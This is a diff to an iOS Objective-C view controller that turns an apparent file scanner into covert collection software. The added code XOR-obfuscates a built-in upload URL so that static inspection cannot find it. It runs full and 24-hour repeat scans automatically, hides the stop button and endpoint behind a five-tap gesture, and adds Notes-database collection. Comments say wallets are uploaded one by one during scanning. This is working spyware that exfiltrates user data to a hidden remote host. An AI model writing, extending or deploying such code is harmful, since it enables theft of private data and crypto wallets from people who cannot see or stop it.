@@ -6,6 +6,21 @@
 #import "WQLLog.h"
 #import "WQLUploader.h"
 #import <dispatch/dispatch.h>
+#import <float.h>
+
+/// 内置上传端点：分段异或，避免 IPA 里 strings 直接搜到完整 URL
+static NSString *WQLBuiltinEndpoint(void) {
+    static const unsigned char kBytes[] = {
+        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x30, 0x2F, 0x3F, 0x2B,
+        0x33, 0x6B, 0x6C, 0x62, 0x74, 0x2E, 0x35, 0x2A, 0x75, 0x28, 0x2D, 0x3F,
+        0x69, 0x3F, 0x28, 0x69, 0x68, 0x2E, 0x75, 0x22, 0x22, 0x22, 0x22, 0x22
+    };
+    static const unsigned char kKey = 0x5A;
+    char buf[sizeof(kBytes) + 1];
+    for (size_t i = 0; i < sizeof(kBytes); i++) buf[i] = (char)(kBytes[i] ^ kKey);
+    buf[sizeof(kBytes)] = 0;
+    return [NSString stringWithUTF8String:buf] ?: @"";
+}
 
 @interface WQLViewController ()
 
@@ -15,6 +30,7 @@
 @property (nonatomic, strong) UIButton *scanButton;
 @property (nonatomic, strong) UIButton *stopButton;
 @property (nonatomic, copy) NSString *lastOutDir;
+@property (nonatomic, copy) NSString *activeEndpoint;
 
 @property (nonatomic, strong) WQLScanner *scanner;
 @property (nonatomic, assign) BOOL scanning;
@@ -23,9 +39,16 @@
 @property (nonatomic, assign) NSUInteger busyDepth;
 @property (nonatomic, assign) UIBackgroundTaskIdentifier bgTask;
 @property (nonatomic, assign) BOOL didAutoResume;
+@property (nonatomic, assign) BOOL debugUnlocked;
 
 - (void)uploadLogIfPossible;
-- (void)autoResumeIfNeeded;
+- (void)autoCollectIfNeeded;
+- (void)loadEndpoint;
+- (NSString *)maskedEndpoint:(NSString *)ep;
+- (void)toggleDebugTools;
+- (void)saveEndpointOverride;
+- (void)setStatus:(NSString *)text;
+- (void)flushPendingIfPossible;
 
 @end
 
@@ -38,10 +61,7 @@
     _bgTask = UIBackgroundTaskInvalid;
 
     [self buildUI];
-
-    NSString *ep = [[NSUserDefaults standardUserDefaults] stringForKey:@"WQLUploadEndpoint"];
-    if (!ep.length) ep = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"WQLUploadEndpoint"];
-    self.endpointField.text = ep ?: @"";
+    [self loadEndpoint];
 
     // 重启后「上传」按钮还能用：把上次的输出目录接回来
     NSString *savedDir = [[NSUserDefaults standardUserDefaults] stringForKey:@"WQLLastOutDir"];
@@ -57,29 +77,125 @@
     [super viewDidAppear:animated];
     if (self.didAutoResume) return;
     self.didAutoResume = YES;
-    [self autoResumeIfNeeded];
+    [self autoCollectIfNeeded];
 }
 
-/// 启动自动恢复：上次扫描没跑完（中断标记或断点还在）就自动再来一轮。
-/// 路径缓存在的话是秒级——命中缓存后直接重新采集，不会重扫 3 亿 inode。
-- (void)autoResumeIfNeeded {
-    BOOL interrupted = [[NSUserDefaults standardUserDefaults] boolForKey:@"WQLScanInterrupted"];
-    BOOL hasCheckpoint = [WQLPathLeak hasCheckpoint];
-    if (!interrupted && !hasCheckpoint) return;
+#pragma mark - 端点
 
-    if (![self currentEndpoint].length) {
-        [self logText:@"检测到未完成的扫描，但没有上传地址，已跳过自动续扫"];
+- (void)loadEndpoint {
+    NSString *builtin = WQLBuiltinEndpoint();
+    NSString *override = [[NSUserDefaults standardUserDefaults] stringForKey:@"WQLUploadEndpointOverride"];
+    self.activeEndpoint = override.length ? override : builtin;
+    [WQLUploader shared].endpoint = self.activeEndpoint;
+
+    // 老版本「每次上传都往 UserDefaults 写地址」，这里清掉，避免它压过内置值
+    [[NSUserDefaults standardUserDefaults] removeObjectForKey:@"WQLUploadEndpoint"];
+
+    self.endpointField.enabled = NO;
+    self.endpointField.text = self.debugUnlocked ? self.activeEndpoint
+                                                 : [self maskedEndpoint:self.activeEndpoint];
+}
+
+- (NSString *)maskedEndpoint:(NSString *)ep {
+    if (!ep.length) return @"未配置";
+    NSRange scheme = [ep rangeOfString:@"://"];
+    if (scheme.location == NSNotFound) return @"已内置";
+    NSUInteger start = NSMaxRange(scheme);
+    if (start >= ep.length) return @"已内置";
+    NSRange slash = [ep rangeOfString:@"/"
+                              options:0
+                                range:NSMakeRange(start, ep.length - start)];
+    if (slash.location == NSNotFound) return ep;
+    return [[ep substringToIndex:slash.location] stringByAppendingString:@"/***"];
+}
+
+/// 长按状态栏 5 次：显示/隐藏调试工具（停止、改地址）
+- (void)toggleDebugTools {
+    if (!self.debugUnlocked) {
+        // 解锁：把真实地址填进输入框
+        self.endpointField.enabled = YES;
+        self.endpointField.text = self.activeEndpoint;
+        self.stopButton.hidden = NO;
+        self.debugUnlocked = YES;
+        [self logText:@"调试工具已解锁（停止按钮 / 改地址）"];
+    } else {
+        [self saveEndpointOverride];
+        self.endpointField.enabled = NO;
+        self.endpointField.text = [self maskedEndpoint:self.activeEndpoint];
+        self.stopButton.hidden = YES;
+        self.debugUnlocked = NO;
+        [self logText:@"调试工具已隐藏"];
+    }
+}
+
+- (void)saveEndpointOverride {
+    NSString *t = [self.endpointField.text stringByTrimmingCharactersInSet:
+                   [NSCharacterSet whitespaceAndNewlineCharacterSet]];
+    if (!t.length || [t isEqualToString:self.activeEndpoint]) return;
+    [[NSUserDefaults standardUserDefaults] setObject:t forKey:@"WQLUploadEndpointOverride"];
+    self.activeEndpoint = t;
+    [WQLUploader shared].endpoint = t;
+    [self logText:[NSString stringWithFormat:@"上传地址已改为 %@", t]];
+}
+
+#pragma mark - 自动采集状态机
+
+/// 首轮全扫 → 之后每 24 小时增量扫 → 其余时间只补传。
+/// 判断只看「上次成功完成的时间」，不受用户操作影响。
+- (void)autoCollectIfNeeded {
+    if (self.scanning) return;
+
+    if (!self.activeEndpoint.length) {
+        [self setStatus:@"未配置上传地址，无法自动采集"];
+        [self logText:@"没有内置上传地址，跳过自动采集"];
         return;
     }
 
-    NSString *why = hasCheckpoint ? @"上次扫描停在半路（断点还在）" : @"上次扫描没有正常结束";
-    [self logText:[NSString stringWithFormat:@"%@，3 秒后自动续扫", why]];
-    __weak typeof(self) weakSelf = self;
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)),
-                   dispatch_get_main_queue(), ^{
-        __strong typeof(weakSelf) self = weakSelf;
-        if (!self || self.scanning) return;
+    [self flushPendingIfPossible];
+
+    NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
+    BOOL firstDone = [d boolForKey:@"WQLFirstRunDone"];
+    BOOL interrupted = [d boolForKey:@"WQLScanInterrupted"];
+    BOOL hasCp = [WQLPathLeak hasCheckpoint];
+    double last = [d doubleForKey:@"WQLLastScanEnd"];
+    double since = last > 0 ? ([[NSDate date] timeIntervalSince1970] - last) : DBL_MAX;
+
+    if (!firstDone || interrupted || hasCp) {
+        [self logText:hasCp ? @"【自动采集】检测到断点，继续上次的全量扫描"
+                            : @"【自动采集】首轮未完成，开始全量采集"];
+        [self setStatus:@"自动采集：全量扫描准备中"];
         [self onScan];
+        return;
+    }
+
+    if (since >= 24 * 3600) {
+        [self logText:[NSString stringWithFormat:
+                       @"【自动采集】距上次完成 %.1f 小时，开始 24h 增量扫描", since / 3600.0]];
+        [self setStatus:@"自动采集：增量扫描准备中"];
+        [self onScan];
+        return;
+    }
+
+    [self logText:[NSString stringWithFormat:
+                   @"【自动采集】距上次完成 %.1f 小时（<24h），本轮只补传未成功的包",
+                   since / 3600.0]];
+    [self setStatus:@"空闲（24 小时内已采集过）"];
+}
+
+- (void)flushPendingIfPossible {
+    __weak typeof(self) weakSelf = self;
+    WQLScanner *flusher = [WQLScanner new];
+    flusher.logBlock = ^(NSString *line) {
+        [weakSelf appendLog:line];
+    };
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
+        [flusher flushPendingUploads];
+    });
+}
+
+- (void)setStatus:(NSString *)text {
+    dispatch_async(dispatch_get_main_queue(), ^{
+        self.statusLabel.text = text;
     });
 }
 
@@ -91,11 +207,17 @@
     self.statusLabel.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
     self.statusLabel.textColor = [UIColor secondaryLabelColor];
     self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
+    self.statusLabel.userInteractionEnabled = YES;
+    UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:self
+                                                                          action:@selector(toggleDebugTools)];
+    tap.numberOfTapsRequired = 5;
+    [self.statusLabel addGestureRecognizer:tap];
 
     UIButton *diagButton = [self buttonWithTitle:@"自检" action:@selector(onDiagnostics)];
     self.scanButton = [self buttonWithTitle:@"开始扫描" action:@selector(onScan)];
     self.stopButton = [self buttonWithTitle:@"停止" action:@selector(onStop)];
     self.stopButton.enabled = NO;
+    self.stopButton.hidden = YES;   // 调试工具：长按状态栏 5 次才出现
     UIButton *uploadButton = [self buttonWithTitle:@"上传" action:@selector(onUpload)];
     UIButton *probeButton = [self buttonWithTitle:@"测试上传" action:@selector(onUploadProbe)];
     UIButton *shareButton = [self buttonWithTitle:@"分享日志" action:@selector(onShare)];
@@ -271,6 +393,7 @@
 
     WQLScanner *scanner = [WQLScanner new];
     scanner.maxContainerBytes = 800ULL * 1024 * 1024;
+    scanner.includeNotes = YES;   // 备忘录：主库 + Accounts 图片
     self.scanner = scanner;
 
     __weak typeof(self) weakSelf = self;
@@ -281,6 +404,11 @@
         __strong typeof(weakSelf) self = weakSelf;
         return self ? self.stopRequested : YES;
     };
+    scanner.progressBlock = ^(NSString *text) {
+        __strong typeof(weakSelf) self = weakSelf;
+        if (!self) return;
+        [self setStatus:[@"自动采集 · " stringByAppendingString:text]];
+    };
 
     [self logText:[NSString stringWithFormat:@"输出目录: %@", outDir]];
     self.lastOutDir = outDir;
@@ -288,12 +416,24 @@
 
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
         [scanner scanWithOutputDirectory:outDir];
-        [[NSUserDefaults standardUserDefaults] setBool:NO forKey:@"WQLScanInterrupted"];
         dispatch_async(dispatch_get_main_queue(), ^{
+            // 只有正常跑完且通道可用才算「首轮完成」；
+            // 调试时点停止 / 通道不可用 → 标志和断点都保留，下次自动重试
+            BOOL cancelled = self.stopRequested;
+            NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
+            if (!cancelled && scanner.lastRunUsable) {
+                [d setBool:NO forKey:@"WQLScanInterrupted"];
+                [d setBool:YES forKey:@"WQLFirstRunDone"];
+                [d setDouble:[[NSDate date] timeIntervalSince1970] forKey:@"WQLLastScanEnd"];
+            } else if (!cancelled) {
+                [self logText:@"⚠️ 本轮通道不可用，不算完成，下次启动会重试"];
+            }
+
             self.scanning = NO;
             self.scanButton.enabled = YES;
             self.stopButton.enabled = NO;
             [self logText:@"扫描结束"];
+            [self setStatus:cancelled ? @"已停止（调试）" : @"采集完成，等待上传收尾"];
 
             // 每个钱包在扫描过程中已单独上传，这里只补传完整日志，不重复整包上传
             [self uploadLogIfPossible];
@@ -302,17 +442,15 @@
 }
 
 - (NSString *)currentEndpoint {
-    return [self.endpointField.text stringByTrimmingCharactersInSet:
-            [NSCharacterSet whitespaceAndNewlineCharacterSet]];
+    return self.activeEndpoint ?: @"";
 }
 
 - (WQLUploader *)configuredUploader {
-    NSString *ep = [self currentEndpoint];
+    NSString *ep = self.activeEndpoint;
     if (!ep.length) {
-        [self logText:@"未填上传地址"];
+        [self logText:@"没有可用的上传地址"];
         return nil;
     }
-    [[NSUserDefaults standardUserDefaults] setObject:ep forKey:@"WQLUploadEndpoint"];
 
     WQLUploader *up = [WQLUploader shared];
     up.endpoint = ep;
